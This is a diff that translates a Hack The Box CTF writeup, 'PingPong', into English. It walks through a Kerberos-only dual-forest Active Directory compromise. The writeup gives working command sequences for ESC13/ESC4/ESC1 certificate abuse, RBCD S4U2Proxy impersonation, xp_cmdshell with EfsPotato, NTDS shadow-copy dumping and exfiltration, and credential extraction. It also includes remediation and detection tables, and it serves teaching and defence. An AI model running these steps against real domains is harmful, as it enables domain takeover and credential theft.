@@ -1,199 +1,200 @@
 # 🏓 PINGPONG: Full Writeup
 
-**Plataforma:** Hack The Box (Season 10, weekly) · **Dificultad:** Hard
-**Tipo:** Active Directory dual-forest (Kerberos-only, sin NTLM)
+**Platform:** Hack The Box (Season 10, weekly) · **Difficulty:** Hard
+**Type:** Dual-forest Active Directory (Kerberos-only, no NTLM)
 **Targets:**
-- User flag: `C:\Users\C.Carlssen\Desktop\user.txt` en DC2 (PONG.HTB); se lee con SYSTEM en DC2 (post-EfsPotato)
-- Root flag: `C:\Users\Administrator\Desktop\root.txt` en DC1 (PING.HTB)
+- User flag: `C:\Users\C.Carlssen\Desktop\user.txt` on DC2 (PONG.HTB), readable with SYSTEM on DC2 (post-EfsPotato)
+- Root flag: `C:\Users\Administrator\Desktop\root.txt` on DC1 (PING.HTB)
 
-**Resultado:** ambos dominios comprometidos (DA de PING y PONG), ambas flags.
+**Result:** both domains compromised (DA of PING and PONG).
 
-> Flags redactadas por política de HTB (no se publican en writeups públicos).
-
-> Writeup honesto: la vía a PONG es original de esta resolución. El cierre en PING usó una pista externa (writeup de la box) que luego fue verificada y demostrada con método propio (sección "Segunda pasada"). Detalle en la sección de honestidad.
+> Honest writeup: the path into PONG is original to this resolution. The closing move in PING used an external hint (public writeup of the box) that was later verified and demonstrated with our own method (see "Second pass"). Details in the honesty section.
 
 ---
 
-## Tabla de contenidos
-1. [Resumen ejecutivo](#resumen-ejecutivo)
-2. [Arquitectura del lab](#arquitectura-del-lab)
-3. [Línea de tiempo](#línea-de-tiempo)
-4. [Fase 1: Foothold en PING (ESC13 → WinRM)](#fase-1-foothold-en-ping-esc13--winrm)
-5. [Fase 2: PONG, la vía propia (RBCD + SQL + EfsPotato → DA)](#fase-2-pong-la-vía-propia-rbcd--sql--efspotato--da)
-6. [Fase 3: Root flag en PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)](#fase-3-root-flag-en-ping-cross-forest-dacl--esc4--esc1--pkinit)
-7. [Segunda pasada: el camino con método propio](#segunda-pasada-el-camino-con-método-propio)
-8. [Severidad (CVSS aproximado por fase)](#severidad-cvss-aproximado-por-fase)
-9. [Remediación](#remediación)
-10. [Detección (blue team)](#detección-blue-team)
-11. [Lecciones](#lecciones)
-12. [Honestidad](#honestidad)
+## Table of contents
+1. [Executive summary](#executive-summary)
+2. [Lab architecture](#lab-architecture)
+3. [Timeline](#timeline)
+4. [Phase 1: Foothold in PING (ESC13 → WinRM)](#phase-1-foothold-in-ping-esc13--winrm)
+5. [Phase 2: PONG, the original path (RBCD + SQL + EfsPotato → DA)](#phase-2-pong-the-original-path-rbcd--sql--efspotato--da)
+6. [Phase 3: Root flag in PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)](#phase-3-root-flag-in-ping-cross-forest-dacl--esc4--esc1--pkinit)
+7. [Second pass: the path with our own method](#second-pass-the-path-with-our-own-method)
+8. [Severity (approximate CVSS per phase)](#severity-approximate-cvss-per-phase)
+9. [Remediation](#remediation)
+10. [Detection (blue team)](#detection-blue-team)
+11. [Lessons](#lessons)
+12. [Honesty](#honesty)
 
 ---
 
-## Resumen ejecutivo
+## Executive summary
 
-PingPong es un lab de AD dual-forest: un trust bidireccional entre **PING.HTB** (DC1, punto de entrada externo) y **PONG.HTB** (DC2, solo interno). NTLM está deshabilitado en ambos dominios, por lo que toda autenticación es Kerberos puro. El reloj del lab corre ~8 horas adelantado respecto a UTC, lo que obliga a compensar con `faketime` en cada operación Kerberos. RC4 está deshabilitado en PONG (claves AES256 obligatorias).
+PingPong is a dual-forest AD lab: a bidirectional trust between **PING.HTB** (DC1, external entry point) and **PONG.HTB** (DC2, internal only). NTLM is disabled in both domains, so every authentication is pure Kerberos. The lab clock runs about 8 hours ahead of UTC, which forces clock compensation (`faketime`) on every Kerberos operation. RC4 is disabled in PONG (AES256 keys mandatory).
 
-La cadena completa:
+The full chain:
 
 ```
-c.roberts (PING) 
-  → ESC13 TemporaryWinRM → WinRM en DC1
-  → pivote a PONG (vía propia: RBCD gMSA + SPN NetBIOS del SQL)
-  → xp_cmdshell (svc_sql) → EfsPotato → SYSTEM en DC2
+c.roberts (PING)
+  → ESC13 TemporaryWinRM → WinRM on DC1
+  → pivot to PONG (original path: gMSA RBCD + SQL NetBIOS SPN)
+  → xp_cmdshell (svc_sql) → EfsPotato → SYSTEM on DC2
   → shadow copy + NTDS → DA PONG
-  → R.Martinelli (PONG) es miembro (vía FSP) del grupo custom "CA Managers" de PING, con WriteDacl sobre SmartcardAuthentication
-  → ESC4 sobre SmartcardAuthentication → ESC1 (cert de Administrator@ping.htb)
+  → R.Martinelli (PONG) is a member (via FSP) of the custom "CA Managers" group of PING,
+    which holds WriteDacl over SmartcardAuthentication
+  → ESC4 on SmartcardAuthentication → ESC1 (Administrator@ping.htb certificate)
   → PKINIT → DA PING → root flag
 ```
 
-## Arquitectura del lab
+## Lab architecture
 
-| Elemento | Detalle |
+| Item | Detail |
 |---|---|
-| PING.HTB | DC1: dc1.ping.htb, dual-homed: IP externa variable + 192.168.2.1 (red interna) |
-| PONG.HTB | DC2: dc2.pong.htb (192.168.2.2, solo interno) |
-| Trust | Bidireccional entre forests |
-| NTLM | Deshabilitado en ambos (Kerberos-only) |
-| RC4 | Deshabilitado en PONG (AES256) |
-| Reloj | ~8h adelantado (faketime relativo: `+8 hours`) |
-| Cuentas clave | c.roberts (foothold), C.Carlssen (GenericWrite sobre svc_sql, user flag), C.Adam (sysadmin SQL), R.Martinelli (FSP en grupo "CA Managers" de PING) |
+| PING.HTB | DC1: dc1.ping.htb, dual-homed: variable external IP + 192.168.2.1 (internal network) |
+| PONG.HTB | DC2: dc2.pong.htb (192.168.2.2, internal only) |
+| Trust | Bidirectional forest trust |
+| NTLM | Disabled in both (Kerberos-only) |
+| RC4 | Disabled in PONG (AES256) |
+| Clock | ~8h ahead (relative faketime: `+8 hours`) |
+| Key accounts | c.roberts (foothold), C.Carlssen (GenericWrite over svc_sql, user flag), C.Adam (SQL sysadmin), R.Martinelli (FSP in PING's "CA Managers" group) |
 
-## Línea de tiempo
+## Timeline
 
-| Fecha | Hito |
+| Date | Milestone |
 |---|---|
-| 2026-08-23 | Enumeración inicial de PING/PONG, ESC13 identificado |
-| 2026-08-24 | Credenciales de PONG, gMSA, primera fase de pivote |
-| 2026-08-28 | SPN NetBIOS del SQL, RBCD, SQL sysadmin, EfsPotato, SYSTEM en DC2, NTDS |
-| 2026-08-29 | DA PONG, user flag, búsqueda de la root flag, cierre con ESC4/ESC1/PKINIT, root flag |
+| 2026-08-23 | Initial enumeration of PING/PONG, ESC13 identified |
+| 2026-08-24 | PONG credentials, gMSA, first pivot phase |
+| 2026-08-28 | SQL NetBIOS SPN, RBCD, SQL sysadmin, EfsPotato, SYSTEM on DC2, NTDS |
+| 2026-08-29 | DA PONG, user flag, root flag hunt, ESC4/ESC1/PKINIT close, root flag |
 
 ---
 
-## Fase 1: Foothold en PING (ESC13 → WinRM)
+## Phase 1: Foothold in PING (ESC13 → WinRM)
 
-Escenario assume-breach: `c.roberts` (grupo IT) con password conocida.
+Assume-breach scenario: `c.roberts` (IT group) with a known password.
 
 ```bash
-# 1. TGT de c.roberts (compensación de reloj siempre)
+# 1. TGT for c.roberts (clock compensation always)
 TZ=UTC KRB5_CONFIG=krb5.conf faketime "+8 hours" \
   getTGT.py 'ping.htb/c.roberts:<REDACTED>' -dc-ip <DC1_IP>
 
-# 2. Enumerar ADCS
+# 2. Enumerate ADCS
 KRB5CCNAME=c.roberts.ccache faketime "+8 hours" \
   certipy find -u c.roberts@ping.htb -k -no-pass -dc-ip <DC1_IP> -target dc1.ping.htb -vulnerable -stdout
 ```
 
-Hallazgo: el template **TemporaryWinRM** tiene una *issuance policy* (OID) vinculada al grupo **TempWinRMAccess**. Eso es **ESC13**: al autenticarse por PKINIT con el certificado de ese template, el KDC inyecta la membresía del grupo en el PAC (el grupo vinculado al OID debe ser de scope universal).
+Finding: the **TemporaryWinRM** template has an issuance policy (OID) linked to the **TempWinRMAccess** group. That is **ESC13**: when authenticating via PKINIT with a certificate from that template, the KDC injects the group membership into the PAC (the group linked to the OID must be universal in scope).
 
 ```bash
-# 3. Enrolar el cert y obtener el TGT PKINIT (el que lleva la membresía)
+# 3. Enroll the certificate and get the PKINIT TGT (the one carrying the membership)
 certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
   -template TemporaryWinRM -target dc1.ping.htb
 certipy auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb
 ```
 
-**Detalle que costó descubrir:** el WinRM del DC1 **no** usa el SPN `HTTP/dc1.ping.htb`, usa **`WSMAN/dc1.ping.htb`** (el SPN de la cuenta DC1$, confirmado empíricamente: con el ticket correcto se obtuvo shell WinRM). Pedir tickets con otra service class (HTTP/cifs) no produce un ticket utilizable para el servicio y la autenticación falla. Con el SPN correcto y un cliente Kerberos que lo use, se obtiene shell WinRM como c.roberts.
+**Detail that cost us time:** the WinRM service on DC1 does **not** use the `HTTP/dc1.ping.htb` SPN; it uses **`WSMAN/dc1.ping.htb`** (the SPN of the DC1$ account, confirmed empirically: with the correct ticket we got a WinRM shell). Requesting tickets with another service class (HTTP/cifs) does not produce a usable ticket for the service and authentication fails.
 
 ```bash
 KRB5CCNAME=c.roberts.ccache getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/c.roberts'
-# WinRM (cliente con service="WSMAN")
+# WinRM (client with service="WSMAN")
 ```
 
-## Fase 2: PONG, la vía propia (RBCD + SQL + EfsPotato → DA)
+## Phase 2: PONG, the original path (RBCD + SQL + EfsPotato → DA)
 
-*Esta mitad es original de esta resolución; no sale de ningún writeup.*
+*This half is original to this resolution; it does not come from any writeup.*
 
-> Nota de pivote: el salto inicial de PING a PONG (obtención de las credenciales de C.Carlssen) ocurrió en la fase de enumeración previa: el FSP de c.roberts se agregó al grupo gMSA Managers de PONG (cambio de scope del grupo) para leer el `msDS-ManagedPassword` del gMSA, y el endpoint JEA de DC2 filtró el historial de PowerShell con la password de C.Carlssen. Esta resolución continúa desde C.Carlssen con el RBCD + SQL.
+> Pivot note: the initial jump from PING to PONG (obtaining C.Carlssen's credentials) happened during the earlier enumeration phase: c.roberts' FSP was added to PONG's gMSA Managers group (group scope change) to read the gMSA `msDS-ManagedPassword`, and the JEA endpoint on DC2 leaked the PowerShell history with C.Carlssen's password. This resolution continues from C.Carlssen with RBCD + SQL.
 
-### 2.1 El SPN NetBIOS del SQL
+### 2.1 The SQL NetBIOS SPN
 
-Observación empírica de este lab: la instancia de SQL Server 2022 Express (instancia default, servicio MSSQLSERVER) de DC2 rechazaba los TGS con SPN FQDN (`MSSQLSvc/dc2.pong.htb:1433`) con "Login failed. The login is from an untrusted domain and cannot be used with Windows authentication." (error 18452) en cinco intentos, y aceptó el TGS con el SPN **NetBIOS** (`MSSQLSvc/DC2:1433`) que la cuenta `svc_sql` registra al habilitar TCP. La lección: verificar qué SPN registró realmente el servicio antes de asumir el FQDN. La solución fue doble:
+Empirical observation of this lab: DC2's SQL Server 2022 Express instance (default instance, MSSQLSERVER service) rejected TGS with the FQDN SPN (`MSSQLSvc/dc2.pong.htb:1433`) with "Login failed. The login is from an untrusted domain and cannot be used with Windows authentication." (error 18452) five times, and accepted the TGS with the **NetBIOS** SPN (`MSSQLSvc/DC2:1433`) that the `svc_sql` account registers when TCP is enabled. Lesson: check which SPN the service actually registered before assuming the FQDN.
 
-1. Agregar el SPN NetBIOS a la cuenta `svc_sql` (modificación del atributo `servicePrincipalName` vía S.DS.P). El permiso salía de **C.Carlssen**, que tiene GenericWrite sobre `svc_sql` (lo mismo habilitó el RBCD del gMSA).
-2. Obtener un TGS NetBIOS de **C.Adam** (miembro de Database Admins = sysadmin SQL) usando el RBCD del gMSA + S4U2Proxy. La clave AES256 del gMSA se deriva del blob `msDS-ManagedPassword` (salt `PONG.HTBhost<dnsHostName>` con PBKDF2-HMAC-SHA1).
+The fix was two-fold:
+
+1. Add the NetBIOS SPN to the `svc_sql` account (modification of the `servicePrincipalName` attribute via S.DS.P). The permission came from **C.Carlssen**, who has GenericWrite over `svc_sql` (the same permission enabled the gMSA RBCD).
+2. Obtain a NetBIOS TGS for **C.Adam** (member of Database Admins = SQL sysadmin) using the gMSA RBCD + S4U2Proxy.
 
 ```bash
-# TGT del gMSA (la clave AES256 sale del blob msDS-ManagedPassword)
+# TGT for the gMSA (the AES256 key comes from the msDS-ManagedPassword blob)
 getTGT.py 'pong.htb/Pong_gMSA$' -aesKey <AES256_GMSA> -dc-ip 127.0.0.1
 
-# TGS de C.Adam para MSSQLSvc/DC2:1433 vía S4U2Proxy, autenticado con las llaves del gMSA
+# TGS for C.Adam to MSSQLSvc/DC2:1433 via S4U2Proxy, authenticated with gMSA keys
 KRB5CCNAME=Pong_gMSA$.ccache getST.py -k -no-pass -spn MSSQLSvc/DC2:1433 -impersonate C.Adam \
   'pong.htb/Pong_gMSA$'
-# /etc/hosts: 127.0.0.1 DC2  (para que el target arme el SPN NetBIOS)
+# /etc/hosts: 127.0.0.1 DC2  (so the target builds the NetBIOS SPN)
 mssqlclient.py -k -no-pass -dc-ip 127.0.0.1 'pong.htb/C.Adam@DC2'
 ```
 
-### 2.2 De sysadmin SQL a SYSTEM
+### 2.2 From SQL sysadmin to SYSTEM
 
 ```sql
 SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1
 EXEC xp_cmdshell 'whoami';                -- pong\svc_sql
 ```
 
-`svc_sql` no es admin local, pero tiene **SeImpersonatePrivilege**. Sin transferencia de binarios posible (HTTP y SMB de salida bloqueados), el exploit **EfsPotato** se compiló en el propio host:
+`svc_sql` is not a local admin, but it has **SeImpersonatePrivilege**. With no binary transfer possible (outbound HTTP and SMB blocked), the **EfsPotato** exploit was compiled on the host itself:
 
-1. Source en chunks base64 vía `xp_cmdshell` → `certutil -decode`.
-2. Compilar con `csc.exe` del .NET Framework (C:\Windows\Temp está denegado para la cuenta de servicio; usar `C:\ProgramData\efs\`).
-3. Ejecutar: `efs.exe "<cmd>"` (sintaxis sin `-c`, pipe `lsarpc` por defecto) → **NT AUTHORITY\SYSTEM**.
+1. Source delivered in base64 chunks via `xp_cmdshell` → `certutil -decode`.
+2. Compiled with `csc.exe` from the .NET Framework (C:\Windows\Temp is denied for the service account; use `C:\ProgramData\efs\`).
+3. Execute: `efs.exe "<cmd>"` (no `-c` flag, `lsarpc` pipe by default) → **NT AUTHORITY\SYSTEM**.
 
-### 2.3 Dump del NTDS y exfiltración
+### 2.3 NTDS dump and exfiltration
 
 ```bash
-vssadmin create shadow /for=C:          # anotar el GUID de la shadow copy
-vssadmin list shadows                   # obtener el nombre HarddiskVolumeShadowCopy<N>
+vssadmin create shadow /for=C:          # note the shadow copy GUID
+vssadmin list shadows                   # get the HarddiskVolumeShadowCopy<N> name
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\ProgramData\efs\ntds.dit
 reg save HKLM\SYSTEM C:\ProgramData\efs\SYSTEM
 reg save HKLM\SECURITY C:\ProgramData\efs\SECURITY
 ```
 
-SMB y HTTP muertos. Dos problemas separados con las herramientas WinRM: evil-winrm 3.9 roto (bug de la gema winrm 2.3.9 con ruby 3.4) y el gssapi ruby sin soporte para tickets AES. La exfiltración se hizo por **WinRM chunked** con el cliente ruby contra DC2 (tickets RC4 de C.Carlssen): se subió `MaxEnvelopeSizekb` del WSMAN a 8192 y se leyó el archivo en rangos de 4 MB con un script PowerShell, decodificando base64 en el atacante. Con `secretsdump -ntds -system -security LOCAL` se obtuvo **DA PONG**: Administrator, krbtgt, 20 cuentas y la trust key. De bonus, el hive SECURITY reveló la password del servicio SQL en claro (LSA secret `_SC_MSSQLSERVER`).
+SMB and HTTP were dead. Two separate problems with the WinRM tooling: evil-winrm 3.9 broken (winrm gem 2.3.9 bug with ruby 3.4) and the ruby gssapi without AES ticket support. Exfiltration was done with **chunked WinRM** using the ruby client against DC2 (C.Carlssen RC4 tickets): `MaxEnvelopeSizekb` was raised to 8192 and the file was read in 4 MB ranges with a PowerShell script, base64-decoded on the attacker side. With `secretsdump -ntds -system -security LOCAL` we got **DA PONG**: Administrator, krbtgt, 20 accounts and the trust key. Bonus: the SECURITY hive revealed the SQL service password in clear text (LSA secret `_SC_MSSQLSERVER`).
 
-## Fase 3: Root flag en PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)
+## Phase 3: Root flag in PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)
 
-La root flag está en el Desktop del Administrator de **PING**, no de PONG. El paso final: una cuenta de PONG, **R.Martinelli**, es miembro (vía Foreign Security Principal) del grupo custom **"CA Managers"** de PING, que tiene un ACE de **WriteDacl/WriteOwner sobre el template SmartcardAuthentication**. Su clave AES256 salió del NTDS de PONG.
+The root flag lives on the Desktop of PING's Administrator, not PONG's. The final move: a PONG account, **R.Martinelli**, is a member (via Foreign Security Principal) of PING's custom **"CA Managers"** group, which holds a **WriteDacl/WriteOwner ACE over the SmartcardAuthentication template**. His AES256 key came from PONG's NTDS.
 
-### 3.1 Tickets cross-realm de R.Martinelli
+### 3.1 R.Martinelli cross-realm tickets
 
 ```bash
 getTGT.py 'pong.htb/r.martinelli' -aesKey <AES256_RMARTINELLI> -dc-ip 127.0.0.1
 getST.py -k -no-pass -spn 'krbtgt/PING.HTB@PING.HTB' 'pong.htb/r.martinelli'
 kvno -S ldap dc1.ping.htb
-# merge de ccaches: TGT + referral + TGS ldap en un solo archivo
+# merge ccaches: TGT + referral + ldap TGS into a single file
 ```
 
-Con el ccache mergeado, el **bind LDAP GSSAPI cross-forest** contra dc1.ping.htb funciona. El mecanismo: el SID nativo de R.Martinelli (no SIDHistory) está representado en PING vía un **Foreign Security Principal**, y ese FSP fue agregado al grupo custom **CA Managers**. El SID filtering del trust (que solo filtra SIDHistory) no aplica acá; la membresía se evalúa normalmente contra el FSP.
+With the merged ccache, the **LDAP GSSAPI cross-forest bind** against dc1.ping.htb works. The mechanism: R.Martinelli's native SID (not SIDHistory) is represented in PING via a **Foreign Security Principal**, and that FSP was added to the custom **CA Managers** group. The trust's SID filtering (which only filters SIDHistory) does not apply here; membership is evaluated normally against the FSP.
 
-### 3.2 ESC4: modificar SmartcardAuthentication
+### 3.2 ESC4: modify SmartcardAuthentication
 
-El grupo "CA Managers" posee WriteDacl/WriteOwner sobre el template, y R.Martinelli (miembro vía FSP) puede modificarlo:
+The "CA Managers" group holds WriteDacl/WriteOwner over the template, so R.Martinelli (member via FSP) can modify it:
 
 ```bash
-# 1. Modificar los flags del template (bind LDAP GSSAPI cross-forest como R.Martinelli):
-#    ldap3 modify de CN=SmartcardAuthentication,CN=Certificate Templates,...
+# 1. Modify the template flags (LDAP GSSAPI cross-forest bind as R.Martinelli):
+#    ldap3 modify of CN=SmartcardAuthentication,CN=Certificate Templates,...
 #      msPKI-Certificate-Name-Flag = 1   (ENROLLEE_SUPPLIES_SUBJECT)
 #      msPKI-Enrollment-Flag = 0
 
-# 2. Otorgar enrollment/control a c.roberts sobre el template:
+# 2. Grant enrollment/control to c.roberts over the template:
 bloodyAD add genericAll \
   'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
   'S-1-5-21-750635624-2058721901-1932338391-2617'   # c.roberts
 ```
 
-Notas de infraestructura: `bloodyAD` usa dnspython y no lee `/etc/hosts`; se usó un resolv.conf temporal con el nameserver del DC1. El enrollment del CA va por el SOCKS del chisel (proxychains + hosts temporal `192.168.2.1 dc1.ping.htb`), porque el puerto 135 del DC1 está filtrado desde afuera.
+Infrastructure notes: `bloodyAD` uses dnspython and does not read `/etc/hosts`; a temporary resolv.conf pointing to the DC1 nameserver was used. The CA enrollment goes through the chisel SOCKS (proxychains + temporary hosts entry `192.168.2.1 dc1.ping.htb`), because DC1's port 135 is filtered from the outside.
 
-### 3.3 ESC1: certificado de Administrator
+### 3.3 ESC1: Administrator certificate
 
 ```bash
 certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
   -template SmartcardAuthentication \
   -upn 'Administrator@ping.htb' \
-  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'   # objectSID del USER
+  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'   # the USER's objectSID
 ```
 
-El `-sid` debe ser el **objectSID del usuario** (500), no el del grupo Domain Admins (512). El strong mapping de KB5014754 exige que UPN y SID apunten al mismo objeto.
+The `-sid` must be the **user's objectSID** (500), not the Domain Admins group SID (512). KB5014754 strong mapping requires UPN and SID to point to the same object.
 
-### 3.4 PKINIT → DA de PING
+### 3.4 PKINIT → DA of PING
 
 ```bash
 certipy auth -pfx administrator.pfx -username administrator -domain ping.htb
@@ -202,81 +203,77 @@ getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/administrator'
 # type C:\Users\Administrator\Desktop\root.txt
 ```
 
-**Root flag:** `[REDACTED]` (política de HTB)
+---
+
+## Second pass: the path with our own method
+
+> Methodological post-mortem: Phase 3 describes the executed attack; this section proves the same vector was visible with systematic enumeration. It is not a duplicate finding, it is a reproducibility check.
+
+1. **NTDS inventory of PONG**: every account with its SID (R.Martinelli = `S-1-5-21-2410575906-...-1124`).
+2. **DACLs of PING's templates**: `SmartcardAuthentication` has a **WriteDacl/WriteOwner** ACE for the **"CA Managers"** group (RID 2627), a custom group, immediately suspicious.
+3. **"CA Managers" members**: includes the **Foreign Security Principal** of R.Martinelli from PONG.
+4. R.Martinelli's native SID (represented by the FSP) is evaluated normally against the group in PING: he is an effective member of CA Managers → WriteDacl over the template → ESC4 → ESC1 → DA.
+
+The signature to look for in this kind of lab: **custom groups whose members include FSPs from other domains**.
 
 ---
 
-## Segunda pasada: el camino con método propio
+## Severity (approximate CVSS per phase)
 
-> Post-mortem metodológico: la Fase 3 describe el ataque ejecutado; esta sección demuestra que el mismo vector era visible con enumeración sistemática. No es un hallazgo duplicado, es la verificación de reproducibilidad.
-
-Después de resolver el lab, se verificó que la pieza final era visible con enumeración sistemática, sin pistas externas:
-
-1. **Inventario del NTDS de PONG**: cada cuenta con su SID (R.Martinelli = `S-1-5-21-2410575906-...-1124`).
-2. **DACLs de los templates de PING**: `SmartcardAuthentication` tiene un ACE de **WriteDacl/WriteOwner** para el grupo **"CA Managers"** (RID 2627), un grupo custom e inmediatamente sospechoso.
-3. **Miembros de "CA Managers"**: incluye el **Foreign Security Principal** de R.Martinelli de PONG.
-4. El SID nativo de R.Martinelli (representado por el FSP) se evalúa normalmente contra el grupo en PING: es miembro efectivo de CA Managers → WriteDacl sobre el template → ESC4 → ESC1 → DA.
-
-La firma a buscar en cualquier lab de este estilo: **grupos custom cuyos miembros incluyen FSPs de otros dominios**.
-
----
-
-## Severidad (CVSS aproximado por fase)
-
-| Fase | Vector | Severidad | CVSS aprox. |
+| Phase | Vector | Severity | Approx. CVSS |
 |---|---|---|---|
-| ESC13 (TemporaryWinRM) | Elevación de privilegios vía ADCS con inyección de membresía de grupo en PAC | Alta | 8.8 |
-| RBCD + GenericWrite sobre svc_sql + SQL sysadmin | Compromiso total del dominio PONG | Crítica | 9.8 |
-| EfsPotato (SeImpersonate) | SYSTEM en DC2 | Alta | 7.8 |
-| FSP en grupo "CA Managers" + ESC4 + ESC1 | Compromiso total del dominio PING vía trust | Crítica | 9.8 |
+| ESC13 (TemporaryWinRM) | ADCS privilege escalation with PAC group injection | High | 8.8 |
+| RBCD + GenericWrite over svc_sql + SQL sysadmin | Full compromise of PONG domain | Critical | 9.8 |
+| EfsPotato (SeImpersonate) | SYSTEM on DC2 | High | 7.8 |
+| FSP in "CA Managers" + ESC4 + ESC1 | Full compromise of PING domain via trust | Critical | 9.8 |
 
-> Son estimaciones de contexto (lab de entrenamiento), no un assessment formal.
+> Context estimates for a training lab, not a formal assessment.
 
-## Remediación
+## Remediation
 
-| Hallazgo | Remediación |
+| Finding | Remediation |
 |---|---|
-| ESC13 TemporaryWinRM | Eliminar el vínculo de issuance policy del template al grupo, o restringir el enrollment solo a cuentas necesarias |
-| ESC4/ESC1 SmartcardAuthentication | Quitar WriteDacl/WriteOwner de grupos no privilegiados ("CA Managers") y volver a restringir `msPKI-Certificate-Name-Flag` (sin ENROLLEE_SUPPLIES_SUBJECT) |
-| GenericWrite sobre svc_sql | Auditar ACEs sobre cuentas de servicio; mínimo privilegio |
-| FSP en grupos locales | Revisar Foreign Security Principals en grupos con permisos sobre infraestructura sensible (ADCS) |
-| SPN de servicios | Verificar los SPNs registrados reales (`setspn -L`) y monitorear cambios |
-| KB5014754 | Implementar el enforcement estricto del strong mapping (evita UPN/SAN mismatch en PKINIT) |
+| ESC13 TemporaryWinRM | Remove the issuance policy link from the template to the group, or restrict enrollment to required accounts |
+| ESC4/ESC1 SmartcardAuthentication | Remove WriteDacl/WriteOwner from non-privileged groups ("CA Managers") and restore `msPKI-Certificate-Name-Flag` (no ENROLLEE_SUPPLIES_SUBJECT) |
+| GenericWrite over svc_sql | Audit ACEs over service accounts; least privilege |
+| FSPs in local groups | Review Foreign Security Principals in groups with permissions over sensitive infrastructure (ADCS) |
+| Service SPNs | Verify the actually registered SPNs (`setspn -L`) and monitor changes |
+| KB5014754 | Enforce strict strong mapping (prevents UPN/SAN mismatch in PKINIT) |
 
-## Detección (blue team)
+## Detection (blue team)
 
-| Actividad | Fuente de detección |
+| Activity | Detection source |
 |---|---|
-| Modificación de `servicePrincipalName` (SPN NetBIOS agregado) | Eventos de cambio de atributos (LDAP) |
-| Requests de TGS con `msDS-AllowedToActOnBehalfOfOtherIdentity` | Evento 4769 con flags de S4U |
-| Habilitación de `xp_cmdshell` + ejecución | Eventos de SQL Server / auditoría de procesos |
-| `vssadmin create shadow` + lectura de NTDS | Evento 7036 / acceso a archivos |
-| Modificación de un template de ADCS (ESC4) | Eventos 4899/4900 (template update) y/o 5136 (modify de objeto DS) |
-| Request de certificado con UPN/SAN ajeno | Evento 4886 con UPN mismatch |
-| PKINIT de una cuenta con certificado recién emitido | Evento 4768 con cert info |
-| `MaxEnvelopeSizekb` elevado en WSMAN | Cambio de configuración del servicio |
+| `servicePrincipalName` modification (added NetBIOS SPN) | LDAP attribute change events |
+| TGS requests with `msDS-AllowedToActOnBehalfOfOtherIdentity` | Event 4769 with S4U flags |
+| `xp_cmdshell` enable + execution | SQL Server events / process auditing |
+| `vssadmin create shadow` + NTDS reads | Event 7036 / file access |
+| ADCS template modification (ESC4) | Events 4899/4900 (template update) and/or 5136 (DS object modify) |
+| Certificate request with foreign UPN/SAN | Event 4886 with UPN mismatch |
+| PKINIT of an account with a freshly issued certificate | Event 4768 with cert info |
+| `MaxEnvelopeSizekb` raised in WSMAN | Service configuration change |
 
-## Lecciones
+## Lessons
 
-1. **SPN de servicios en Server 2022**: el WinRM usa `WSMAN/<fqdn>`; verificar la existencia real del SPN antes de culpar al Kerberos.
-2. **Cross-forest con FSP**: el SID nativo de una cuenta foránea representado como Foreign Security Principal y agregado a un grupo local se evalúa normal (el SID filtering solo filtra SIDHistory, no aplica acá).
-3. **`certipy find -vulnerable` puede no atribuir el ESC4 cross-forest**: el principal con WriteDacl es un Foreign Security Principal que no se resuelve como cuenta del atacante. Mirar los DACLs directamente y los miembros de grupos custom.
-4. **KB5014754**: en el `certipy req`, `-sid` = objectSID del usuario (500), no el del grupo (512).
-5. **La instancia SQL (Express, default) validó el SPN NetBIOS del TGS**, no el FQDN (en este lab). Verificar los SPNs reales registrados por el servicio.
-6. **EfsPotato** funcionó en este DC2 (Server 2022); compilar en el host con `csc.exe` cuando no hay transferencia de binarios.
-7. **`C:\Windows\Temp` denegado** para cuentas de servicio no-admin: usar `C:\ProgramData`.
-8. **Variables de entorno SIEMPRE antes de `faketime`**: `VAR=x faketime "+8 hours" cmd`.
-9. **gssapi ruby no maneja tickets AES**: usar libkrb5 (curl/kvno) o RC4 cuando el KDC lo permita.
-10. **bloodyAD usa dnspython**, no `/etc/hosts`: resolv.conf temporal con el nameserver del DC.
+1. **Service SPNs on Server 2022**: WinRM uses `WSMAN/<fqdn>`; verify the actual SPN existence before blaming Kerberos.
+2. **Cross-forest with FSPs**: a foreign account's native SID represented as a Foreign Security Principal and added to a local group is evaluated normally (SID filtering only filters SIDHistory, it does not apply here).
+3. **`certipy find -vulnerable` may miss the cross-forest ESC4**: the principal with WriteDacl is a Foreign Security Principal that does not resolve to the attacker. Look at the DACLs directly and at the members of custom groups.
+4. **KB5014754**: in `certipy req`, `-sid` = the user's objectSID (500), not the group SID (512).
+5. **The SQL instance (Express, default) validated the NetBIOS SPN of the TGS**, not the FQDN (in this lab). Verify the SPNs the service actually registered.
+6. **EfsPotato** worked on this DC2 (Server 2022); compile on the host with `csc.exe` when there is no binary transfer.
+7. **`C:\Windows\Temp` denied** for non-admin service accounts: use `C:\ProgramData`.
+8. **Environment variables ALWAYS before `faketime`**: `VAR=x faketime "+8 hours" cmd`.
+9. **Ruby gssapi does not handle AES tickets**: use libkrb5 (curl/kvno) or RC4 when the KDC allows it.
+10. **bloodyAD uses dnspython**, not `/etc/hosts`: temporary resolv.conf with the DC nameserver.
 
-## Honestidad
+## Honesty
 
-- **100% propio:** la vía completa a PONG (SPN NetBIOS, RBCD, EfsPotato en host, exfiltración WinRM chunked), el hallazgo del SPN `WSMAN/`, toda la infraestructura (túneles, proxychains, merge de ccaches, flujo LDAP cross-forest), la user flag, DA PONG.
-- **Pista externa (writeup de la box, concedido tras horas):** que R.Martinelli era la llave del final. El dato estaba en los propios archivos (NTDS de PONG) y se verificó después con método propio (grupo CA Managers + FSP).
